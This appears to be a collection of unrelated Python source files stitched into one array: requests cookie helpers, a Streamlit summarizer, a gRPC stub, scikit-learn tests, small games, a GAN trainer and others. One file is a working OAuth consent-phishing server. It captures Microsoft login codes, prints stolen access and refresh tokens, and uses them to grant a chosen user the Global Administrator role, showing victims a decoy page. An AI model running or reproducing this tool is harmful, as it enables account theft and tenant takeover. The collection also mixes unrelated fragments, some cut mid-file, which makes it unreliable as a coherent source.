(not necessarily a RequestsCookieJar)\n    :param request: our own requests.Request object\n    :param response: urllib3.HTTPResponse object\n    \"\"\"\n    if not (hasattr(response, \"_original_response\") and response._original_response):\n        return\n    # the _original_response field is the wrapped httplib.HTTPResponse object,\n    req = MockRequest(request)\n    # pull out the HTTPMessage with the headers and put it in the mock:\n    res = MockResponse(response._original_response.msg)\n    jar.extract_cookies(res, req)\n\n\ndef get_cookie_header(jar, request):\n    \"\"\"\n    Produce an appropriate Cookie header string to be sent with `request`, or None.\n\n    :rtype: str\n    \"\"\"\n    r = MockRequest(request)\n    jar.add_cookie_header(r)\n    return r.get_new_headers().get(\"Cookie\")\n\n\ndef remove_cookie_by_name(cookiejar, name, domain=None, path=None):\n    \"\"\"Unsets a cookie by name, by default over all domains and paths.\n\n    Wraps CookieJar.clear(), is O(n).\n    \"\"\"\n    clearables = []\n    for cookie in cookiejar:\n        if cookie.name != name:\n            continue\n        if domain is not None and domain != cookie.domain:\n            continue\n        if path is not None and path != cookie.path:\n            continue\n        clearables.append((cookie.domain, cookie.path, cookie.name))\n\n    for domain, path, name in clearables:\n        cookiejar.clear(domain, path, name)\n\n\nclass CookieConflictE",
    "import streamlit as st\nimport speech_recognition as sr\nfrom pydub import AudioSegment\nimport os\nimport streamlit as st\n# Install Modules\n# !pip install transformers==2.8.0\n# !pip install torch==1.4.0\n# !pip install datasets transformers[sentencepiece]\n# !pip install sentencepiece\n\nst.set_page_config(layout=\"wide\")\n\n# Import Module\nimport torch\n# from transformers import T5Tokenizer, T5ForConditionalGeneration, T5Config\nfrom transformers import T5Tokenizer, T5ForConditionalGeneration, T5Config\n\nfrom PyPDF2 import PdfReader\n\n# initialize the pretrained model\n# model = T5ForConditionalGeneration.from_pretrained('t5-base')\n# tokenizer = T5Tokenizer.from_pretrained('t5-base')\n# device = torch.device('cpu')\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nmodel = T5ForConditionalGeneration.from_pretrained('t5-base').to(device)\ntokenizer = T5Tokenizer.from_pretrained('t5-base')\n\n\n\ndef preprocess_text(text):\n    # Replace the special characters with the correct quotation marks\n    text = text.replace(\"?\", '\"').replace(\"?\", \"'\")\n\n    # Remove the extra spaces and newlines\n    text = text.strip().replace(\"\\n\", \" \")\n\n    # Add a period at the end of the text if it is missing\n    if not text.endswith(\".\"):\n        text = text + \".\"\n\n    # Prepend the text with the prefix \"summarize: \" to indicate the task to the model\n    t5_prepared_Text = \"summarize: \" + text\n\n    return t5_prepared_Text\n\n\n@st.cache_resource\ndef text_summary(text):\n    t5_prepared_Text = preprocess_text(text)\n    tokenized_text = tokenizer.encode(t5_prepared_Text, return_tensors=\"pt\").to(device)\n    summary_ids = model.generate(tokenized_text,\n                                 num_beams=4,\n                                 no_repeat_ngram_size=3,\n                                 min_length=30,\n                                 max_length=200,\n                                 length_penalty=2.0,\n                                 temperature=0.8)\n    output = tokenizer.decode(summary_ids[0], skip_special_tokens=True)\n    return output\n\n\n\n\n\ndef extract_text_from_pdf(file_path):\n    # Open the PDF file using PyPDF2\n    with open(file_path, \"rb\") as f:\n        reader = PdfReader(f)\n        page = reader.pages[0]\n        text = page.extract_text()\n    return text\n\n\nimport pytesseract as tess\nfrom PIL import Image\ntess.pytesseract.tesseract_cmd=r'C:\\Users\\manoj\\AppData\\Local\\Programs\\Tesseract-OCR\\tesseract.exe'\n\nfrom PyPDF2 import PdfReader\n\n\n# Add elements to sidebar\nchoose_option = st.sidebar.selectbox('Select your choice', ['Summarize Text','Summarize Image Text', 'Summarize Audio Text', 'Summarize document'])\n\nif choose_option == 'Summarize Text' :\n    st.subheader(\"Summarizing Text\")\n    text= st.text_area(\"Enter a text\")\n    if st.button(\"Submit\"):\n        col1, col2 = st.columns([1,1])\n        with col1:\n            if text:\n                st.markdown(\"**Your Input Text**\")\n                st.info(text)\n        with col2:\n            if text:\n                st.markdown(\"**Summary Result**\")\n                result = text_summary(text)\n                st.success(result)\n    else:\n        pass\n\n\nelif choose_option == 'Summarize Image Text':\n    st.subheader(\"Summarizing Image Text\")\n    def convert_image_to_text(image_path):\n        img = Image.open(image_path)\n        text = tess.image_to_string(img)\n        return text\n\n    def main():\n        # st.title(\"Image to Text Converter\")\n        st.write(\"Upload an image and convert it to text\")\n        uploaded_file = st.file_uploader(\"Choose an image...\", type=[\"jpg\", \"jpeg\", \"png\"])\n        if uploaded_file is not None:\n            image = Image.open(uploaded_file)\n            st.image(image, caption='Uploaded Image', use_column_width=True)\n            text = convert_image_to_text(uploaded_file)\n            # st.header(\"Extracted Text:\")\n            # st.write(text)\n            col1, col2 = st.columns([1,1])\n            with col1:\n                st.markdown(\"**Your Input Text**\")\n                st.info(text)\n            with col2:\n                st.markdown(\"**Summary Result**\")\n                result = text_summary(text)\n                st.success(result)\n\n    if __name__ == \"__main__\":\n        main()\n\nelif choose_option == 'Summarize Audio Text':\n    st.subheader(\"Summarizing Audio Text\")\n    def convert_mp3_to_wav(file_path):\n        audio = AudioSegment.from_file(file_path)\n        wav_file_path = file_path.replace(\".mp3\", \".wav\")\n        audio.export(wav_file_path, format=\"wav\")\n        return wav_file_path\n\n    def audio_to_text(audio_file_path):\n        recognizer = sr.Recognizer()\n        with sr.AudioFile(audio_file_path) as audio_file:\n            audio_data = recognizer.record(audio_file)\n\n            try:\n                text = recognizer.recognize_google(audio_data)\n                return text\n            except sr.UnknownValueError:\n                st.error(\"Google Speech Recognition could not understand audio.\")\n            except sr.RequestError as e:\n               ",
    "# Generated by the gRPC Python protocol compiler plugin. DO NOT EDIT!\n\"\"\"Client and server classes corresponding to protobuf-defined services.\"\"\"\nimport grpc\n\nimport ftp_pb2 as ftp__pb2\n\n\nclass FTPStub(object):\n    \"\"\"Missing associated documentation comment in .proto file.\"\"\"\n\n    def __init__(self, channel):\n        \"\"\"Constructor.\n\n        Args:\n            channel: A grpc.Channel.\n        \"\"\"\n        self.Upload = channel.stream_unary(\n                '/ftp.FTP/Upload',\n                request_serializer=ftp__pb2.File.SerializeToString,\n                response_deserializer=ftp__pb2.UploadRes.FromString,\n                )\n        self.Download = channel.unary_stream(\n                '/ftp.FTP/Download',\n                request_serializer=ftp__pb2.DownloadReq.SerializeToString,\n                response_deserializer=ftp__pb2.File.FromString,\n                )\n\n\nclass FTPServicer(object):\n    \"\"\"Missing associated documentation comment in .proto file.\"\"\"\n\n    def Upload(self, request_iterator, context):\n        \"\"\"Missing associated documentation comment in .proto file.\"\"\"\n        context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n        context.set_details('Method not implemented!')\n        raise NotImplementedError('Method not implemented!')\n\n    def Download(self, request, context):\n        \"\"\"Missing associated documentation comment in .proto file.\"\"\"\n        context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n        context.set_details('Method not implemented!')\n        raise NotImplementedError('Method not implemented!')\n\n\ndef add_FTPServicer_to_server(servicer, server):\n    rpc_method_handlers = {\n            'Upload': grpc.stream_unary_rpc_method_handler(\n                    servicer.Upload,\n                    request_deserializer=ftp__pb2.File.FromString,\n                    response_serializer=ftp__pb2.UploadRes.SerializeToString,\n            ),\n            'Download': grpc.unary_stream_rpc_method_handler(\n                    servicer.Download,\n                    request_deserializer=ftp__pb2.DownloadReq.FromString,\n                    response_serializer=ftp__pb2.File.SerializeToString,\n            ),\n    }\n    generic_handler = grpc.method_handlers_generic_handler(\n            'ftp.FTP', rpc_method_handlers)\n    server.add_generic_rpc_handlers((generic_handler,))\n\n\n # This class is part of an EXPERIMENTAL API.\nclass FTP(object):\n    \"\"\"Missing associated documentation comment in .proto file.\"\"\"\n\n    @staticmethod\n    def Upload(request_iterator,\n            target,\n            options=(),\n            channel_credentials=None,\n            call_credentials=None,\n            insecure=False,\n            compression=None,\n            wait_for_ready=None,\n            timeout=None,\n            metadata=None):\n        return grpc.experimental.stream_unary(request_iterator, target, '/ftp.FTP/Upload',\n            ftp__pb2.File.SerializeToString,\n            ftp__pb2.UploadRes.FromString,\n            options, channel_credentials,\n            insecure, call_credentials, compression, wait_for_ready, timeout, metadata)\n\n    @staticmethod\n    def Download(request,\n            target,\n            options=(),\n            channel_credentials=None,\n            call_credentials=None,\n            insecure=False,\n            compression=None,\n            wait_for_ready=None,\n            timeout=None,\n            metadata=None):\n        return grpc.experimental.unary_stream(request, target, '/ftp.FTP/Download',\n            ftp__pb2.DownloadReq.SerializeToString,\n            ftp__pb2.File.FromString,\n            options, channel_credentials,\n            insecure, call_credentials, compression, wait_for_ready, timeout, metadata)\n",
    "import numpy as np\nimport pytest\nfrom numpy.testing import assert_allclose\nfrom scipy import sparse\n\nfrom sklearn.datasets import make_blobs\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.tree import DecisionTreeClassifier\nfrom sklearn.utils._testing import assert_almost_equal, assert_array_almost_equal\nfrom sklearn.utils.class_weight import compute_class_weight, compute_sample_weight\n\n\ndef test_compute_class_weight():\n    # Test (and demo) compute_class_weight.\n    y = np.asarray([2, 2, 2, 3, 3, 4])\n    classes = np.unique(y)\n\n    cw = compute_class_weight(\"balanced\", classes=classes, y=y)\n    # total effect of samples is preserved\n    class_counts = np.bincount(y)[2:]\n    assert_almost_equal(np.dot(cw, class_counts), y.shape[0])\n    assert cw[0] < cw[1] < cw[2]\n\n\ndef test_compute_class_weight_not_present():\n    # Raise error when y does not contain all class labels\n    classes = np.arange(4)\n    y = np.asarray([0, 0, 0, 1, 1, 2])\n    with pytest.raises(ValueError):\n        compute_class_weight(\"balanced\", classes=classes, y=y)\n    # Fix exception in error message formatting when missing label is a string\n    # https://github.com/scikit-learn/scikit-learn/issues/8312\n    with pytest.raises(\n        ValueError, match=r\"The classes, \\[0, 1, 2, 3\\], are not in class_weight\"\n    ):\n        compute_class_weight({\"label_not_present\": 1.0}, classes=classes, y=y)\n    # Raise error when y has items not in classes\n    classes = np.arange(2)\n    with pytest.raises(ValueError):\n        compute_class_weight(\"balanced\", classes=classes, y=y)\n    with pytest.raises(ValueError):\n        compute_class_weight({0: 1.0, 1: 2.0}, classes=classes, y=y)\n\n    # y contains a unweighted class that is not in class_weights\n    classes = np.asarray([\"cat\", \"dog\"])\n    y = np.asarray([\"dog\", \"cat\", \"dog\"])\n    class_weights = {\"dogs\": 3, \"cat\": 2}\n    msg = r\"The classes, \\['dog'\\], are not in class_weight\"\n\n    with pytest.raises(ValueError, match=msg):\n        compute_class_weight(class_weights, classes=classes, y=y)\n\n\ndef test_compute_class_weight_dict():\n    classes = np.arange(3)\n    class_weights = {0: 1.0, 1: 2.0, 2: 3.0}\n    y = np.asarray([0, 0, 1, 2])\n    cw = compute_class_weight(class_weights, classes=classes, y=y)\n\n    # When the user specifies class weights, compute_class_weights should just\n    # return them.\n    assert_array_almost_equal(np.asarray([1.0, 2.0, 3.0]), cw)\n\n    # When a class weight is specified that isn't in classes, the weight is ignored\n    class_weights = {0: 1.0, 1: 2.0, 2: 3.0, 4: 1.5}\n    cw = compute_class_weight(class_weights, classes=classes, y=y)\n    assert_allclose([1.0, 2.0, 3.0], cw)\n\n    class_weights = {-1: 5.0, 0: 4.0, 1: 2.0, 2: 3.0}\n    cw = compute_class_weight(class_weights, classes=classes, y=y)\n    assert_allclose([4.0, 2.0, 3.0], cw)\n\n\ndef test_compute_class_weight_invariance():\n    # Test that results with class_weight=\"balanced\" is invariant wrt\n    # class imbalance if the number of samples is identical.\n    # The test uses a balanced two class dataset with 100 datapoints.\n    # It creates three versions, one where class 1 is duplicated\n    # resulting in 150 points of class 1 and 50 of class 0,\n    # one where there are 50 points in class 1 and 150 in class 0,\n    # and one where there are 100 points of each class (this one is balanced\n    # again).\n    # With balancing class weights, all three should give the same model.\n    X, y = make_blobs(centers=2, random_state=0)\n    # create dataset where class 1 is duplicated twice\n    X_1 = np.vstack([X] + [X[y == 1]] * 2)\n    y_1 = np.hstack([y] + [y[y == 1]] * 2)\n    # create dataset where class 0 is duplicated twice\n    X_0 = np.vstack([X] + [X[y == 0]] * 2)\n    y_0 = np.hstack([y] + [y[y == 0]] * 2)\n    # duplicate everything\n    X_ = np.vstack([X] * 2)\n    y_ = np.hstack([y] * 2)\n    # results should be identical\n    logreg1 = LogisticRegression(class_weight=\"balanced\").fit(X_1, y_1)\n    logreg0 = LogisticRegression(class_weight=\"balanced\").fit(X_0, y_0)\n    logreg = LogisticRegression(class_weight=\"balanced\").fit(X_, y_)\n    assert_array_almost_equal(logreg1.coef_, logreg0.coef_)\n    assert_array_almost_equal(logreg.coef_, logreg0.coef_)\n\n\ndef test_compute_class_weight_balanced_negative():\n    # Test compute_class_weight when labels are negative\n    # Test with balanced class labels.\n    classes = np.array([-2, -1, 0])\n    y = np.asarray([-1, -1, 0, 0, -2, -2])\n\n    cw = compute_class_weight(\"balanced\", classes=classes, y=y)\n    assert len(cw) == len(classes)\n    assert_array_almost_equal(cw, np.array([1.0, 1.0, 1.0]))\n\n    # Test with unbalanced class labels.\n    y = np.asarray([-1, 0, 0, -2, -2, -2])\n\n    cw = compute_class_weight(\"balanced\", classes=classes, y=y)\n    assert len(cw) == len(classes)\n    class_counts = np.bincount(y + 2)\n    assert_almost_equal(np.dot(cw, class_counts), y.shape[0])\n    assert_array_almost_equal(cw, [2.0 / 3, 2.0, 1.0])\n\n\ndef test_compute_class_weight_balanced_unordered():\n    # ",
    "# Libraries\nfrom turtle import Turtle, Screen\nimport random\n\n\nis_race_on = False\nscreen = Screen()\nscreen.setup(width=500, height=400)\nuser_bet = screen.textinput(title=\"Make your bet\", prompt=\"Which turtle will win the race? Enter a color: \")\nprint(user_bet)\ncolors = ['red', 'orange', 'yellow', 'green', 'blue', 'pink']\ny_positions = [-70, -40, -10, 20, 50, 80]\nall_turtles = []\n\n\nfor turtle_index in range(0, 6):\n    new_turtle = Turtle(shape='turtle')\n    new_turtle.color(colors[turtle_index])\n    new_turtle.penup()\n    new_turtle.goto(x=-230, y=y_positions[turtle_index])\n    all_turtles.append(new_turtle)\n\nif user_bet:\n    is_race_on = True\n\n\nwhile is_race_on:\n    for turtle in all_turtles:\n        if turtle.xcor() > 220:\n            is_race_on = False\n            winner = turtle.pencolor()\n            if winner == user_bet:\n                print(f\"You have won! The winning turtle was {winner}\")\n            else:\n                print(f\"You have lost! The winning turtle was {winner}\")\n\n        rand_distance = random.randint(0, 10)\n        turtle.forward(rand_distance)\n\n\nscreen.exitonclick()\n\n\n",
    "from pytube import YouTube\nimport os\nimport customtkinter\n\n\ndef SucessNote():\n    texto2= customtkinter.CTkLabel(janela, text=\"Successfully Downloaded!!!\", font=(\"Consolas\", 15))\n    texto2.pack()\n    \ndef FailNote():\n    texto2= customtkinter.CTkLabel(janela, text=\"Something Went Wrong Please Try Again....\", font=(\"Consolas\", 15))\n    texto2.pack(padx=10, pady=10)\n\ndef Dowload(URL):\n    yt = YouTube(URL) \n    try:\n        print(\"\\nDownloading....\")\n        video = yt.streams.filter(only_audio=True).first()\n        out_file = video.download()\n        base, ext = os.path.splitext(out_file)\n        new_file = base + \".mp3\"\n        os.rename(out_file, new_file)\n        SucessNote()\n        print(\"\\nSuccessfully Downloaded!!!\\n\")\n    except:\n        FailNote()\n        print(\"\\nSomething Went Wrong Please Try Again....\\n\")\n        \n\njanela = customtkinter.CTk()\njanela.title(\"Music Downloader\")\njanela.geometry(\"500x300\")\njanela.minsize(500,300)\n\n\ntexto= customtkinter.CTkLabel(janela, font=(\"Consolas\", 20),text=\"Music Download\")\ntexto.pack(padx=20, pady=20)\n\nURL = customtkinter.CTkEntry(janela,width=400, placeholder_text=\"Insert Link\")\nURL.pack(padx=50,pady=50)\n\nbotao = customtkinter.CTkButton(janela, text=\"Download\", command=lambda: Dowload(URL.get()))\nbotao.pack(padx=10,pady=10)\n\njanela.mainloop()\n",
    "import flask\nimport adal\nimport threading,ssl,os,sys\nimport requests\n\n\n\n\ntoken = None\nrefresh_token = None\napp = flask.Flask(__name__)\n\nclient_id = \"<app id>\"\nurl = \"https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=\" + client_id + \"&scope=https://graph.microsoft.com/.default%20offline_access%20openid%20profile%20&redirect_uri=https://localhost/login/authorized&response_mode=query\"\nclient_secret = \"<app secret>\"\nRedirectAfterStealing = '/maintanance'\ntoken = \"\"\nuserid = \"<user id to be upgraded>\"\nroleid = \"62e90394-69f5-4237-9190-012177145e10\" # global administrator\n\ndef main(refresh_token, client_id, client_secret):\n    pass  \n\n@app.route('/login/authorized', methods=['GET', 'POST'])\ndef authorized():\n    \n    global token\n    global refresh_token\n    code = flask.request.args['code']\n    auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)\n    response = auth_context.acquire_token_with_authorization_code( code, \"https://localhost/login/authorized\", 'https://graph.microsoft.com/', client_id, client_secret)\n    refresh_token = response['refreshToken']\n    access_token = response['accessToken']\n    print()\n    print(\"access token:\")\n    print(access_token)\n    print()    \n    token = \"Bearer \" + access_token\n    print()  \n    print()\n    return flask.redirect(RedirectAfterStealing)\n\n\n@app.route('/roles')\ndef roles():\n    print()\n    print(\"using token:\")\n    print(token)\n    print(\"calling roles api call.\")\n    response = requests.get(\" https://graph.microsoft.com/v1.0/directoryRoles\", headers={\"Authorization\":token}) \n    print()\n    print(response.json())\n    print()\n    return flask.redirect(RedirectAfterStealing)\n\n@app.route('/add_roles')\ndef addroles():\n    \n    url = \"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": token\n    }\n    data = {\n    \"@odata.type\": \"#microsoft.graph.unifiedRoleAssignment\",\n    \"roleDefinitionId\": roleid,\n    \"principalId\": userid,\n    \"directoryScopeId\": \"/\"\n    }\n\n    response = requests.post(url, headers=headers, json=data)\n    print()\n    print(\"trying to add user to role:\")\n    print(\"Response:\", response.text)\n    print()\n    return flask.redirect(RedirectAfterStealing)\n\n\n@app.route('/maintanance')\ndef index():\n   return flask.send_from_directory(\".\", path=\"maintanance.html\") # just a random html  to be present to attacker\n\n@app.route('/refresh')\ndef refresh():\n   print(\"refreshing access token.\")\n   url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'\n   global refresh_token,token    \n   auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)\n   response = auth_context.acquire_token_with_refresh_token(refresh_token, client_id, 'https://graph.microsoft.com/', client_secret)\n   refresh_token = response['refreshToken']\n   access_token = response['accessToken']\n   token = \"Bearer \" + access_token\n   print()\n   print(\"new access token:\")\n   print(access_token)\n   print()\n   return flask.redirect(RedirectAfterStealing)\n\n\nif __name__ == \"__main__\":\n    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n    cert = os.path.dirname(os.path.abspath(sys.argv[0])) + \"/server.cert\" # just create one with openssl\n    key  = os.path.dirname(os.path.abspath(sys.argv[0])) + \"/server.key\"  # just create one with openssl\n    context.load_cert_chain(cert, key)\n    app.run(debug=True,port=443,use_reloader=False,  ssl_context=context)\n",
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.optim as optim\nfrom torchvision import datasets, transforms\nfrom torch.autograd import Variable\nfrom torchvision.utils import save_image\n\n\nbs = 512 # batch size\nz_dim = 100\nn_epoch = 40\n\n\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\nprint(\"device is: \", device)\n\n# MNIST Dataset\ntransform = transforms.Compose([\n    transforms.ToTensor(),\n    transforms.Normalize(mean=(0.5,), std=(0.5,))])\n\ntrain_dataset = datasets.MNIST(root='./mnist_data/', train=True, transform=transform, download=True)\ntest_dataset = datasets.MNIST(root='./mnist_data/', train=False, transform=transform, download=False)\n\n# Data Loader (Input Pipeline)\ntrain_loader = torch.utils.data.DataLoader(dataset=train_dataset, batch_size=512, shuffle=True)\ntest_loader = torch.utils.data.DataLoader(dataset=test_dataset, batch_size=512, shuffle=False)\n\nclass Generator(nn.Module):\n    def __init__(self, g_input_dim, g_output_dim):\n        super(Generator, self).__init__()       \n        self.fc1 = nn.Linear(g_input_dim, 256)\n        self.fc2 = nn.Linear(self.fc1.out_features, self.fc1.out_features*2)\n        self.fc3 = nn.Linear(self.fc2.out_features, self.fc2.out_features*2)\n        self.fc4 = nn.Linear(self.fc3.out_features, g_output_dim)\n    \n    # forward method\n    def forward(self, x): \n        x = F.leaky_relu(self.fc1(x), 0.2)\n        x = F.leaky_relu(self.fc2(x), 0.2)\n        x = F.leaky_relu(self.fc3(x), 0.2)\n        return torch.tanh(self.fc4(x))\n    \nclass Discriminator(nn.Module):\n    def __init__(self, d_input_dim):\n        super(Discriminator, self).__init__()\n        self.fc1 = nn.Linear(d_input_dim, 1024)\n        self.fc2 = nn.Linear(self.fc1.out_features, self.fc1.out_features//2)\n        self.fc3 = nn.Linear(self.fc2.out_features, self.fc2.out_features//2)\n        self.fc4 = nn.Linear(self.fc3.out_features, 1)\n    \n    # forward method\n    def forward(self, x):\n        x = F.leaky_relu(self.fc1(x), 0.2)\n        x = F.dropout(x, 0.3)\n        x = F.leaky_relu(self.fc2(x), 0.2)\n        x = F.dropout(x, 0.3)\n        x = F.leaky_relu(self.fc3(x), 0.2)\n        x = F.dropout(x, 0.3)\n        return torch.sigmoid(self.fc4(x))\n    \n# build network\nmnist_dim = train_dataset.train_data.size(1) * train_dataset.train_data.size(2)\n\nG = Generator(g_input_dim = z_dim, g_output_dim = mnist_dim).to(device)\nD = Discriminator(mnist_dim).to(device)\n\nprint(\"Print G and D\")\nprint(G)\nprint(D)\n\n\n# loss\ncriterion = nn.BCELoss() \n\n# optimizer\nlr = 0.0002 \nG_optimizer = optim.Adam(G.parameters(), lr = lr)\nD_optimizer = optim.Adam(D.parameters(), lr = lr)\n\ndef D_train(x):\n    D.zero_grad()\n\n    mini_batch = x.size(0)  # \ud604\uc7ac \ubc30\uce58\uc758 \ud06c\uae30\ub97c \uc5bb\uc2b5\ub2c8\ub2e4.\n\n    # \ud604\uc7ac \ubc30\uce58 \ud06c\uae30\uc5d0 \ub9de\ucdb0 \ubaa9\ud45c \ud150\uc11c\ub97c \uc0dd\uc131\ud569\ub2c8\ub2e4.\n    y_real_ = torch.ones(mini_batch, 1).to(device)\n    y_fake_ = torch.zeros(mini_batch, 1).to(device)\n\n    # train discriminator on real\n    x_real = x.view(-1, mnist_dim).to(device)\n    D_output = D(x_real)\n    D_real_loss = criterion(D_output, y_real_)\n\n    # train discriminator on fake\n    z = torch.randn(mini_batch, z_dim).to(device)\n    x_fake = G(z)\n    D_output = D(x_fake)\n    D_fake_loss = criterion(D_output, y_fake_)\n\n    # gradient backprop & optimize ONLY D's parameters\n    D_loss = D_real_loss + D_fake_loss\n    D_loss.backward()\n    D_optimizer.step()\n        \n    return D_loss.item()\n\n\ndef G_train(x):\n    #=======================Train the generator=======================#\n    G.zero_grad()\n\n    z = Variable(torch.randn(bs, z_dim).to(device))\n    y = Variable(torch.ones(bs, 1).to(device))\n\n    G_output = G(z)\n    D_output = D(G_output)\n    G_loss = criterion(D_output, y)\n\n    # gradient backprop & optimize ONLY G's parameters\n    G_loss.backward()\n    G_optimizer.step()\n        \n    return G_loss.data.item()\n\n\nfor epoch in range(1, n_epoch+1):           \n    D_losses, G_losses = [], []\n    for batch_idx, (x, _) in enumerate(train_loader):\n        D_losses.append(D_train(x))\n        G_losses.append(G_train(x))\n\n    print('[%d/%d]: loss_d: %.3f, loss_g: %.3f' % (\n            (epoch), n_epoch, torch.mean(torch.FloatTensor(D_losses)), torch.mean(torch.FloatTensor(G_losses))))\n    \n\nwith torch.no_grad():\n    test_z = Variable(torch.randn(bs, z_dim).to(device))\n    generated = G(test_z)\n\n    save_image(generated.view(generated.size(0), 1, 28, 28), './samples/sample_' + '.png')",
    "import pandas as pd\r\nimport nltk\r\nfrom nltk.sentiment.vader import SentimentIntensityAnalyzer\r\nimport matplotlib.pyplot as plt\r\n\r\nnltk.download('vader_lexicon')\r\n\r\nfile = 'input_data.csv'\r\ndfs = pd.read_csv(file)\r\n\r\nproduct_sentiments = {}\r\n\r\n# Plot count of reviews by stars\r\nax = dfs['averageRating'].value_counts().sort_index().plot(kind='bar',\r\n                                                          title='Count of Reviews by Stars',\r\n                                                          figsize=(10, 5))\r\nax.set_xlabel('Review Stars')\r\nax.set_ylabel('Number of Products Sold')  # Add ylabel for count of products\r\n\r\n# Annotate each bar with the count of products\r\nfor i, count in enumerate(dfs['averageRating'].value_counts().sort_index()):\r\n    ax.text(i, count, str(count), ha='center', va='bottom')\r\nplt.show()\r\n\r\n\r\ndef analyze_product_sentiment(product_name):\r\n    matching_products = dfs[dfs['productTitle'].str.lower().str.contains(product_name.lower())]['productTitle'].unique()\r\n\r\n    if len(matching_products) == 0:\r\n        print(f\"No products found matching '{product_name}'.\")\r\n    elif len(matching_products) == 1:\r\n        product_reviews = dfs[(dfs['productTitle'].str.lower() == matching_products[0].lower()) & (dfs['reviewDescription'].notnull())]['reviewDescription'].tolist()\r\n        calculate_sentiment(matching_products[0], product_reviews)\r\n    else:\r\n        print(\"Multiple products found matching your input:\")\r\n        for idx, product in enumerate(matching_products, start=1):\r\n            print(f\"{idx}. {product}\")\r\n        choice = input(\"Enter the number of the specific product you want to analyze: \")\r\n        if choice.isdigit() and int(choice) in range(1, len(matching_products) + 1):\r\n            chosen_product = matching_products[int(choice) - 1]\r\n            product_reviews = dfs[(dfs['productTitle'].str.lower() == chosen_product.lower()) & (dfs['reviewDescription'].notnull())]['reviewDescription'].tolist()\r\n            calculate_sentiment(chosen_product, product_reviews)\r\n        else:\r\n            print(\"Invalid choice.\")\r\n\r\ndef display_reviews(reviews):\r\n    print(\"Here are some of the reviews of the product you searched for:\\n\")\r\n    for review in reviews:\r\n        print(\"+\" + \"-\"*78 + \"+\")  # Border\r\n        print(\"| {:^76} |\".format(review))  # Review content\r\n        print(\"+\" + \"-\"*78 + \"+\")  # Border\r\n    print(\"\\n\")\r\n\r\ndef calculate_sentiment(product_name, product_reviews):\r\n    sid = SentimentIntensityAnalyzer()\r\n    product_scores = []\r\n\r\n    print(f\"\\nSentiment analysis for product '{product_name}':\\n\")\r\n    \r\n    for review in product_reviews:\r\n        ss = sid.polarity_scores(review)\r\n        print(f\"Review: {review}\")\r\n        print(f\"Negative Score: {ss['neg']:.4f}\")\r\n        print(f\"Neutral Score: {ss['neu']:.4f}\")\r\n        print(f\"Positive Score: {ss['pos']:.4f}\")\r\n        print(f\"Compound Score: {ss['compound']:.4f}\")\r\n        print('-' * 111)\r\n\r\n        product_scores.append(ss['compound'])\r\n\r\n    avg_score = sum(product_scores) / len(product_scores)\r\n    product_sentiments[product_name] = avg_score\r\n\r\n    print(f\"Average Sentiment Score: {avg_score:.4f}\")\r\n\r\n    if avg_score >= 0.05:\r\n        comment = \"It's recommended to buy this product.\"\r\n    elif avg_score <= -0.05:\r\n        comment = \"It's not recommended to buy this product.\"\r\n    else:\r\n        comment = \"You may consider buying this product based on other factors.\"\r\n\r\n    print(f\"Conclusion of Product: {comment}\\n\")\r\n\r\n\r\n\r\ndef analyze_all_products_sentiment():\r\n    sid = SentimentIntensityAnalyzer()\r\n    \r\n    for product_name in dfs['productTitle'].unique():\r\n        product_reviews = dfs[(dfs['productTitle'] == product_name) & (dfs['reviewDescription'].notnull())]['reviewDescription'].tolist()\r\n        \r\n        if product_reviews:\r\n            product_scores = []\r\n            \r\n            for review in product_reviews:\r\n                ss = sid.polarity_scores(review)\r\n                product_scores.append(ss['compound'])\r\n            \r\n            avg_score = sum(product_scores) / len(product_scores)\r\n            product_sentiments[product_name] = avg_score\r\n\r\ndef plot_all_products_sentiments():\r\n    total_products = len(product_sentiments)\r\n    print(f\"Total number of Unique products: {total_products}\")\r\n    \r\n    plt.figure(figsize=(10, 6))\r\n    plt.scatter(range(len(product_sentiments)), list(product_sentiments.values()), c=list(product_sentiments.values()), cmap='coolwarm')\r\n    plt.xlabel('')  # Empty x-label\r\n    plt.ylabel('Sentiment Score')\r\n    plt.title('Sentiment Analysis of Products')\r\n    plt.colorbar(label='Sentiment Score')\r\n    plt.grid(True)\r\n    plt.tight_layout()\r\n    plt.show()\r\n\r\n\r\n\r\nproduct_name = input(\"Enter the product name for which you want reviews: \")\r\n\r\nanalyze_product_sentiment(product_name)\r\n\r\nanalyze_all_products_sentiment()\r\nplot_all_products_sentiments()\r\n",
    "# Import necessary libraries\nimport numpy as np\nfrom sklearn import datasets\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.preprocessing import StandardScaler\nfrom sklearn.svm import SVC\nfrom sklearn.metrics import accuracy_score\n\n# Specify the file path for your data\ndata_path = 'Payment.csv'  # Replace with the actual file path\n\n# Load your data\n# Example: If your data is in a CSV file, you can use pandas to read it\n# import pandas as pd\n# data = pd.read_csv(data_path)\n\n# If your data is in a different format or stored differently, adjust the loading accordingly\n\n# For the sake of example, let's assume you are using the Iris dataset\niris = datasets.load_iris()\nX = iris.data\ny = iris.target\n\n# Split the dataset into training and testing sets\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Standardize the feature values\nscaler = StandardScaler()\nX_train = scaler.fit_transform(X_train)\nX_test = scaler.transform(X_test)\n\n# Create an SVM model\nsvm_model = SVC(kernel='linear', C=1.0)\n\n# Train the model on the training set\nsvm_model.fit(X_train, y_train)\n\n# Make predictions on the test set\ny_pred = svm_model.predict(X_test)\n\n# Calculate and print the accuracy\naccuracy = accuracy_score(y_test, y_pred)\nprint(f\"Accuracy: {accuracy * 100:.2f}%\")\n",
